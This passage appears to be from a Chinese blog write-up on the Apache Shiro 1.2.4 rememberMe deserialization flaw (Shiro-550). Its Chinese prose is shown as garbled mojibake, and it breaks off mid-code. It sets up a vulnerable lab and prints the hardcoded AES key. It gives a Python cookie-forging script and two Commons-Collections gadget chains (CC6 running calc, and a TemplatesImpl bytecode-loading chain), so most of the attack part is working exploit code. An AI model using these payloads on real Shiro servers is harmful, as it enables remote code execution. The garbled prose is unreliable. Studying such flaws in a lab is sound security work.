Managementï¼‰</strong>ï¼šShiroå¯ä»¥ç®¡ç†Webå’ŒéWebç¯å¢ƒä¸­çš„ä¼šè¯ã€‚</li><li><strong>Webæ”¯æŒ</strong>ï¼šShiroæä¾›äº†å¯¹Webåº”ç”¨çš„å†…ç½®æ”¯æŒï¼Œå¯ä»¥è½»æ¾é›†æˆåˆ°Servletã€JSPç­‰WebæŠ€æœ¯ä¸­ã€‚</li><li><strong>ç¼“å­˜ï¼ˆCachingï¼‰</strong>ï¼šShiroå†…ç½®äº†ç¼“å­˜æœºåˆ¶ï¼Œå¯ä»¥æé«˜è®¤è¯å’Œæˆæƒè¿‡ç¨‹çš„æ€§èƒ½ã€‚</li><li><strong>ä¼ä¸šçº§å®‰å…¨</strong>ï¼šShiroçš„è®¾è®¡è€ƒè™‘äº†ä¼ä¸šçº§åº”ç”¨çš„éœ€æ±‚ï¼Œæä¾›äº†çµæ´»çš„å®‰å…¨ç­–ç•¥å’Œé›†æˆç‚¹ã€‚</li><li><strong>æ˜“äºé›†æˆ</strong>ï¼šShiroå¯ä»¥è½»æ¾é›†æˆåˆ°ç°æœ‰çš„Javaåº”ç”¨ä¸­ï¼Œæ— è®ºæ˜¯å¤§å‹ä¼ä¸šåº”ç”¨è¿˜æ˜¯å°å‹é¡¹ç›®ã€‚</li><li><strong>å¯æ‰©å±•æ€§</strong>ï¼šShiroçš„æ¶æ„å…è®¸å¼€å‘è€…æ ¹æ®éœ€è¦æ‰©å±•å…¶åŠŸèƒ½ï¼Œä¾‹å¦‚è‡ªå®šä¹‰è®¤è¯å’Œæˆæƒç­–ç•¥ã€‚</li><li><strong>ç¤¾åŒºæ”¯æŒ</strong>ï¼šä½œä¸ºApacheè½¯ä»¶åŸºé‡‘ä¼šçš„ä¸€éƒ¨åˆ†ï¼ŒShiroæ‹¥æœ‰æ´»è·ƒçš„ç¤¾åŒºå’ŒæŒç»­çš„æ›´æ–°ã€‚</li></ol><h1 id="shrioç¯å¢ƒæ­å»º"><a href="#Shrioç¯å¢ƒæ­å»º" class="headerlink" title="Shrioç¯å¢ƒæ­å»º"></a>Shrioç¯å¢ƒæ­å»º</h1><p>å¯ä»¥ç›´æ¥ä»githubä¸Šé¢å°†ä»£ç cloneåˆ°æœ¬åœ°ï¼š<a href="https://github.com/apache/shiro">https://github.com/apache/shiro</a></p><p>ç„¶ååˆ‡æ¢å›1.2.4çš„ç‰ˆæœ¬ï¼Œè¯¥ç‰ˆæœ¬å°±æ˜¯shiro550çš„æ¼æ´</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git@github.com:apache/shiro.git<br>git checkout shiro-root-1.2.4<br></code></pre></td></tr></table></figure><p>ç¼–è¾‘shiro&#x2F;samples&#x2F;webç›®å½•ä¸‹çš„pom.xml,å°†jstlçš„ç‰ˆæœ¬ä¿®æ”¹ä¸º1.2ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151444228.png" alt="image-20240611233305207"></p><p>ç„¶åé…ç½®TomcatæœåŠ¡å™¨å°†ç¯å¢ƒè·‘èµ·æ¥å³å¯ï¼Œè®°å¾—æ·»åŠ ä¸€ä¸ª<strong>samples_web_war</strong>å·¥ä»¶</p><p><img src="http://cdn.clown2024.cn/202407151444229.png" alt="image-20240611233723956"></p><p><img src="http://cdn.clown2024.cn/202407151444230.png" alt="image-20240611233734929"></p><p>ç¯å¢ƒæ­å»ºå’Œæ¼æ´åˆ†æéƒ½å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/">Shiroååºåˆ—åŒ–æ¼æ´ç¬”è®°ä¸€ï¼ˆåŸç†ç¯‡ï¼‰ (changxia3.com)</a></p><p>æ€ªäº†è¿‡ä¸¤å¤©è¿™ç¯å¢ƒçªç„¶å°±å‡ºé”™äº†</p><p>emmmè¿™é‡Œå¯èƒ½éœ€è¦é…ç½®ä¸€ä¸‹<strong>tomcat&#x2F;conf&#x2F;server.xml</strong>æ–‡ä»¶ï¼Œä¸ç„¶ä¼šæŠ¥é”™</p><p><img src="http://cdn.clown2024.cn/202407151444231.png" alt="image-20240613235256764"></p><p>å‚è€ƒè¿™ç¯‡æ–‡ç« <a href="https://blog.csdn.net/seeeeeeeeeee/article/details/124724396">https://blog.csdn.net/seeeeeeeeeee/article/details/124724396</a></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Connector</span> <span class="hljs-attr">port</span>=<span class="hljs-string">&quot;8088&quot;</span> <span class="hljs-attr">protocol</span>=<span class="hljs-string">&quot;HTTP/1.1&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">URIEncoding</span>=<span class="hljs-string">&quot;UTF-8&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">connectionTimeout</span>=<span class="hljs-string">&quot;20000&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">redirectPort</span>=<span class="hljs-string">&quot;8443&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">maxParameterCount</span>=<span class="hljs-string">&quot;1000&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">relaxedPathChars</span>=<span class="hljs-string">&quot;|&#123;&#125;[],_%&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">relaxedQueryChars</span>=<span class="hljs-string">&quot;|&#123;&#125;[],_%&quot;</span></span><br><span class="hljs-tag">               /&gt;</span><br></code></pre></td></tr></table></figure><p>è¯´æ˜¯æ–°ç‰ˆtomcatè¯·æ±‚ä¸å…è®¸ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œè¿™é‡Œå°±æ”¾è¡Œä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œä½†æ”¹äº†ä¹‹åè°·æ­Œè¿˜æ˜¯ä¸è¡Œï¼Œedgeæ”¹æˆhttpå°±å¯ä»¥äº†</p><p>åæ¥æ‰¾äº†åŠå¤©æ‰¾ä¸€ä¸ªæ–¹æ³•ç»ˆäºèƒ½è§£å†³äº†ï¼š<a href="https://blog.csdn.net/qq_69576997/article/details/136731424">https://blog.csdn.net/qq_69576997/article/details/136731424</a></p><p>è°·æ­Œæµè§ˆå™¨urlè¾“å…¥ï¼šchrome:&#x2F;&#x2F;net-internals&#x2F;#hsts</p><p>edgeæµè§ˆå™¨urlè¾“å…¥ï¼šedge:&#x2F;&#x2F;net-internals&#x2F;#hsts</p><p>ç„¶ååœ¨æœ€åä¸€è¡Œçš„<strong>Delete domain security policies</strong>ä¸­è¾“å…¥localhostï¼Œç‚¹å‡»deleteï¼Œç„¶åé‡å¯tomcatå°±å¯ä»¥äº†</p><p><img src="http://cdn.clown2024.cn/202407151444232.png" alt="image-20240614132940906"></p><p>éº»äº†è¿™äº›ç¯å¢ƒé…ç½®ã€‚ã€‚ã€‚</p><h1 id="shiro550æ¼æ´"><a href="#Shiro550æ¼æ´" class="headerlink" title="Shiro550æ¼æ´"></a>Shiro550æ¼æ´</h1><p>Shiro550çš„æ¼æ´æ˜¯å› ä¸ºå…¶å­˜åœ¨å›ºå®škeyåŠ å¯†çš„åŸå› </p><p>åˆ©ç”¨ç‰ˆæœ¬ï¼šshiro&lt;&#x3D;1.2.4</p><h2 id="å¯»æ‰¾å›ºå®škey"><a href="#å¯»æ‰¾å›ºå®škey" class="headerlink" title="å¯»æ‰¾å›ºå®škey"></a>å¯»æ‰¾å›ºå®škey</h2><p>æˆ‘ä»¬è¿™é‡Œä»æºç å…¥æ‰‹æ‰¾åˆ°å…¶å›ºå®škey</p><p>Shiroåœ¨ç™»é™†æ˜¯å‹¾é€‰äº†rememberMeé€‰é¡¹å°±ä¼šè®¾ç½®ä¸€ä¸ªrememberMeçš„cookie</p><p><img src="http://cdn.clown2024.cn/202407151444233.png" alt="image-20240611234659707"></p><p><img src="http://cdn.clown2024.cn/202407151444234.png" alt="image-20240611234718498"></p><p>ä¸”è§£ç çš„æµç¨‹å°±æ˜¯<strong>base64è§£ç &#x3D;ã€‹AESè§£å¯†&#x3D;ã€‹ååºåˆ—åŒ–</strong></p><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥å»æºç æœç´¢å¯¹åº”çš„å‡½æ•°ï¼Œå¯ä»¥å…¨å±€æœç´¢ä¸€ä¸‹Cookieå…³é”®å­—</p><p>å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªCookieRememberMeMangerå‡½æ•°ï¼Œè¿™åå­—å°±å¾ˆæ˜æ˜¾äº†</p><p><img src="http://cdn.clown2024.cn/202407151444235.png" alt="image-20240612000131474"></p><p>ç„¶åé‡Œé¢æœ‰å¯¹cookieå¤„ç†çš„å¾ˆå¤šå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªåºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¹‹ç±»ç›¸å…³çš„æ–¹æ³•ï¼Œè¿™é‡Œå…ˆæ‰¾ä¸€ä¸ªååºåˆ—åŒ–ç›¸å…³çš„å‡½æ•°ï¼Œç„¶åå¾€ä¸Šå¯»æ‰¾è°ƒç”¨é“¾ï¼Œæ‰¾åˆ°ä»–çš„å›ºå®škey</p><p><img src="http://cdn.clown2024.cn/202407151444236.png" alt="image-20240613221027529"></p><p>è¿™é‡Œå°±æ˜¯è·å–åºåˆ—åŒ–å†…å®¹ååºåˆ—åŒ–ï¼Œç„¶åbase64è§£ç ï¼Œè¿”å›çš„å¯¹åº”AESåŠ å¯†çš„å†…å®¹</p><p>å¾€ä¸Šæ‰¾è°ƒç”¨æ–¹æ³•</p><p><img src="http://cdn.clown2024.cn/202407151444237.png" alt="image-20240613221343146"></p><p>è¿™é‡Œè¿›è¡Œäº†convertè½¬æ¢äº†ä¸€ä¸‹ï¼Œè¿™é‡Œå‡½æ•°å†å¾€ä¸Šæ‰¾å·²ç»æ˜¯ä¸€äº›æ ¡éªŒç›¸å…³çš„åŠŸèƒ½äº†ï¼Œé‚£å°±æ˜¯è¿™ä¸ªå‡½æ•°å·²ç»å®Œæˆäº†è§£å¯†ï¼Œè·Ÿè¿›å»å‡½æ•°çœ‹çœ‹</p><p><img src="http://cdn.clown2024.cn/202407151444238.png" alt="image-20240613221819479"></p><p>æœç„¶ï¼Œé‡Œé¢è¿›è¡Œäº†è§£å¯†ï¼Œç„¶åå†è¿›è¡Œååºåˆ—åŒ–ä¹‹åè¿”å›</p><p>ä»å…¶ä¸­çš„å‡½æ•°åŠŸèƒ½æœ€ç»ˆè·Ÿè¸ªä¸‹å»å¯ä»¥åœ¨<strong>AbstractRememberMeManager</strong>è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•æ‰¾åˆ°å›ºå®škeyçš„èµ‹å€¼</p><p><img src="http://cdn.clown2024.cn/202407151444239.png" alt="image-20240612001639914"></p><p><img src="http://cdn.clown2024.cn/202407151444240.png" alt="image-20240612001655002"></p><p>å¯ä»¥çŸ¥é“å…¶å¯†é’¥æ˜¯å›ºå®šå­—ç¬¦ä¸²çš„base64è§£ç å¾—åˆ°</p><p>çŸ¥é“äº†å›ºå®šå¯†é’¥ä¹‹åæ„é€ å¯¹åº”çš„rememberMeå­—ç¬¦ä¸²å°±å¾ˆç®€å•äº†ï¼ŒAESåŠ å¯†çš„è„šæœ¬å¯ä»¥ç½‘ä¸Šæ‰¾ä¸€ä¸‹</p><h2 id="æ‰“ccé“¾"><a href="#æ‰“ccé“¾" class="headerlink" title="æ‰“ccé“¾"></a>æ‰“ccé“¾</h2><p>ä¸€èˆ¬shiroéƒ½ä¼šæœ‰ccçš„åŒ…</p><p><img src="http://cdn.clown2024.cn/202407151444241.png" alt="image-20240612001947670"></p><p>ä½†æ˜¯ä¸ä¸€å®šå¯ä»¥æ‰“ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ’ä»¶åˆ†æä¸€ä¸‹ä¾èµ–å…³ç³»</p><p><img src="http://cdn.clown2024.cn/202407151444242.png" alt="image-20240612002101256"></p><p>è¢«æ ‡äº†testçš„è¿è¡Œæ—¶éƒ½ä¸ä¼šè¢«ç¼–è¯‘ï¼Œæ‰€ä»¥ä¸€èˆ¬çº¿ä¸Šçš„æ—¶å€™éƒ½æ˜¯æ‰“ä¸é€šçš„ï¼Œä¸è¿‡è¿™é‡Œçš„åŸå› æ˜¯æ²¡æœ‰ä»£ç å»ä½¿ç”¨è¿™ä¸ªä¾èµ–ï¼Œæ²¡æœ‰importå®ƒã€‚</p><p><strong>è¿™é‡ŒåŸç”Ÿshiroæ²¡æœ‰è‡ªå¸¦ccä¾èµ–</strong></p><p>è¿™é‡ŒåŠ ä¸€ä¸ª3.2.1çš„ç‰ˆæœ¬</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>AESåŠ å¯†çš„è„šæœ¬</strong></p><p>ç½‘ä¸Šæ‰¾çš„ä¸€ä¸ªè„šæœ¬ï¼š<a href="https://xz.aliyun.com/t/12702?time__1311=mqmhDvox8FGNDQtiQGkI50Qc30Ki=sF54D&alichlgref=https://www.google.com/#toc-1">https://xz.aliyun.com/t/12702?time__1311=mqmhDvox8FGNDQtiQGkI50Qc30Ki%3DsF54D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-1</a></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s:s +((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key),mode,iv)<br>    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br>    <span class="hljs-keyword">return</span> ciphertext<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br>    enc_data = base64.b64encode(enc_data)<br>    unpad = <span class="hljs-keyword">lambda</span> s : s[:-s[-<span class="hljs-number">1</span>]]<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = enc_data[:<span class="hljs-number">16</span>]<br>    encryptor = AES.new(base64.b64decode(key),mode,iv)<br>    plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br>    plaintext = unpad(plaintext)<br>    <span class="hljs-keyword">return</span> plaintext<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br>    <span class="hljs-built_in">print</span>(aes_enc(data))<br></code></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªCryptoåº“æœ‰ç‚¹å‘ï¼Œç¬¬ä¸€æ¬¡ç”¨ï¼Œè®°å½•ä¸€ä¸‹</p><p>å…ˆå®‰è£…ä¸‹é¢è¿™ä¸ªåº“</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pip3 install pycryptodome<br></code></pre></td></tr></table></figure><p>ç„¶åéœ€è¦å»c:\users\86189\appdata\local\programs\python\python37\lib\site-packagesè·¯å¾„ä¸‹å°†ä¸€ä¸ªcryptoçš„æ–‡ä»¶å¤¹çš„cæ”¹æˆå¤§å†™çš„Cå³å¯</p></blockquote><p><strong>å›ºå®šå¯†é’¥</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">kPH+bIxk5D2deZiIxcaaaA==<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å…ˆæ‰“ä¸€ä¸ªcc6çš„é“¾å­è¯•ä¸€è¯•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc6_demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//è¿™é‡Œå…ˆéšä¾¿èµ‹ä¸€ä¸ªå€¼åé¢æ”¹å›æ¥</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//è¿™é‡Œå¾…ä¼šè°ƒç”¨çš„æ—¶å€™ä¼šåœ¨mpaæ–°å¢åŠ ä¸€ä¸ªé”®å€¼å¯¹aaa</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,chainedTransformer);<span class="hljs-comment">//è¿™é‡Œæ”¹å›æ¥chainedTransformer</span><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//ç§»é™¤æ‰æˆ‘ä»¬æ–°å¢çš„é”®å€¼</span><br><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°†ç”Ÿæˆçš„ser.binæ–‡ä»¶è¿›è¡ŒaesåŠ å¯†åå†base64è¿›è¡Œä¼ å‚</p><blockquote><p>è¿™é‡Œæˆ‘ä¸€å¼€å§‹è¯•äº†ä¸€ä¸‹ç”¨cyberchefæ¥åŠ å¯†å‘ç°ä¸è¡Œï¼Œè¿˜æ˜¯å¾—ç”¨ä¸Šé¢çš„è„šæœ¬</p></blockquote><p>å…ˆçœ‹ä¸€ä¸‹æ­£å¸¸çš„ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151444243.png" alt="image-20240614215924819"></p><p>æ‰“äº†cc6çš„ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151444244.png" alt="image-20240614220816682"></p><p>è¿™é‡Œå°±æ˜¯æ²¡ç™»å½•ä¸Šå»æ˜¯æ­£å¸¸çš„ï¼Œåç«¯å¼€å¯debugå»çœ‹ä¸€ä¸‹ï¼Œè¿™æ—¶å€™åº”è¯¥æ˜¯æœ‰æŠ¥é”™çš„</p><p><img src="http://cdn.clown2024.cn/202407151444245.png" alt="image-20240614232811726"></p><p>è¿™é‡Œæ˜¯ååºåˆ—åŒ–æŠ›äº†å¼‚å¸¸ï¼Œè¯´æ˜¯æ— æ³•åŠ è½½invokerTransformerï¼Œå°±æ˜¯ç”±äºshiroæ— æ³•å¤„ç†æ•°ç»„å¯¼è‡´çš„ï¼Œåé¢å†è¯´ï¼Œæ¯”è¾ƒå¤æ‚</p><blockquote><p>ä½†æ˜¯è¿™é‡ŒæŠ¥é”™çš„åˆä¸å¤ªå¯¹å•Šï¼Œä»–æ˜¯ccçš„å…¨éƒ¨ç±»éƒ½æ— æ³•åŠ è½½ï¼Œå¤ªæ€ªäº†</p></blockquote><p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±éœ€è¦æ”¹ä¸€ä¸‹é“¾å­ï¼Œæ”¹æˆä¸ç”¨chainedTransformeræ•°ç»„çš„å½¢å¼ï¼Œä¹Ÿå°±æ˜¯æ‹¼ä¸€ä¸‹é“¾å­å°±å¥½ï¼Œç„¶åæœ€åè¦æ”¹æˆ<strong>åŠ¨æ€ç±»åŠ è½½æ‰§è¡Œä»»æ„ä»£ç çš„æ–¹å¼</strong></p><p>è¿™é‡Œä½¿ç”¨<strong>cc2+cc6+cc3</strong>çš„æ–¹å¼è¿›è¡Œæ‹¼æ¥</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_ccDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//cc3</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//åˆ©ç”¨åå°„è®¾ç½®éœ€è¦æ»¡è¶³çš„å€¼</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\code\\cc_chain\\src\\main\\java\\com.proxy\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-comment">//cc2</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-comment">//cc6</span><br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//è¿™é‡Œå…ˆéšä¾¿èµ‹ä¸€ä¸ªå€¼åé¢æ”¹å›æ¥</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, templates);<span class="hljs-comment">//è¿™é‡Œè¦æ·»åŠ è¿›å»templates</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title 